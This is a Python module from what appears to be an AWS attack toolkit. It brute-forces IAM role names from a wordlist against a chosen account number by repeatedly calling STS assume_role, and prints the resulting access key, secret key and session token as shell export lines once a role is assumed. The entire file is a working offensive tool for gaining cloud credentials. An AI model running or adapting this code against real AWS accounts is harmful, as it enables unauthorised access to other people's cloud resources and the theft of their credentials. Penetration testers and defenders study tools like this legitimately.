import boto3
import os
from colorama import Fore, Style

def assume_role(session, role_name, acc_number, session_name):
    client = session.client('sts')
    try:
        response = client.assume_role(
                RoleArn='arn:aws:iam::{}:role/{}'.format(acc_number, role_name),
                RoleSessionName=session_name,
                DurationSeconds=3600
                )
        return response
    except Exception as e:
        return(e.response["Error"]["Code"])

def brute_role(session):
    wordlist = input("Please specify the wordlist to be used: ")

    if not os.path.exists(wordlist):
        print(Fore.RED + "[-] Wordlist file not found..." + Style.RESET_ALL)

        return False
        
    acc_number = input("Please specify the account number to be used: ")
    session_name = input("Please specify the session name to be used: ")

    if not session_name:
        session_name = "AssumedRole"
        
    role_names_file = open(wordlist, 'r')
    role_names = role_names_file.readlines()

    for role_name in role_names:
        arn = "[+] Trying to impersonate role = arn:aws:iam::{}:role/{}".format(acc_number, role_name.strip())
        print(arn)

        AssumeRole = assume_role(session, role_name.strip(), acc_number, session_name)
        
        if AssumeRole == "AccessDenied":
            pass

        elif AssumeRole["ResponseMetadata"]["HTTPStatusCode"] == 200:
            print(Fore.GREEN + "\n[+] Role Impersonation Successful [+]")
            print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
            print("export AWS_ACCESS_KEY_ID={}".format(AssumeRole["Credentials"]["AccessKeyId"]))
            print("export AWS_SECRET_ACCESS_KEY={}".format(AssumeRole["Credentials"]["SecretAccessKey"]))
            print("export AWS_SESSION_TOKEN={}".format(AssumeRole["Credentials"]["SessionToken"]))
            break

def main(selected_session, session):
    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
    print("[+] Starting Bruteforce Roles Module...\n")

    brute_role(session)